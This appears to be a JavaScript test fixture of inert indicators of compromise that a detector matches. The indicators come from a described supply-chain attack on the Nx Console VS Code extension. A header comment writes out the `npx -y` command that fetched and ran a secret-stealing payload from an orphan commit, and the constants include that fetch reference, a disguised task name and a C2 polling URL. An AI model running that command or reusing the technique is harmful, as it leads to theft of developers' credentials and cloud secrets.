// TEST FIXTURE - inert stand-in for the indicators left by the compromised Nx Console
// 18.95.0 VS Code extension (May 18 2026, TeamPCP). The extension ran
// `npx -y github:nrwl/nx#558b09d7` to fetch a ~498KB payload from an orphan commit in
// the official nrwl/nx repo, stole developer+cloud secrets, and targeted
// ~/.claude/settings.json. The payload SHA-256s are in MALICIOUS_HASHLIST. The strings
// below are the inert IoCs the detector matches.

const ORPHAN_COMMIT = "558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2";
const ORPHAN_TREE = "ba642fe2c7c65e42dd7f6444b83023dc6827e08c";
const FETCH_REF = "github:nrwl/nx#558b09d7";
const TASK_DISGUISE = "install-mcp-extension";
const STATE_KEY = "nxConsole.mcpExtensionInstalledSha";
const DAEMON_FLAG = "__DAEMONIZED=1";
const C2_POLL = "https://api.github.com/search/commits?q=firedalazer";

module.exports = { ORPHAN_COMMIT, ORPHAN_TREE, FETCH_REF, TASK_DISGUISE, STATE_KEY, DAEMON_FLAG, C2_POLL };
